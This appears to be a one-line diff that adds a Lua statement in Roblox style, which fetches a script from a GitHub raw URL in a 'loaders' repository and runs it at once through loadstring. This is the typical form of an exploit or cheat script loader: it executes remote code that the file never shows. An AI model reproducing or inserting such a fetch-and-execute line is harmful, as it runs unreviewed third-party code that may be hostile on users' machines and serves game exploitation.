@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ContractorStrike/loaders/main/loaders/electricity-bricklayer-spam3-d7t0gy99l4ina7.lua"))()
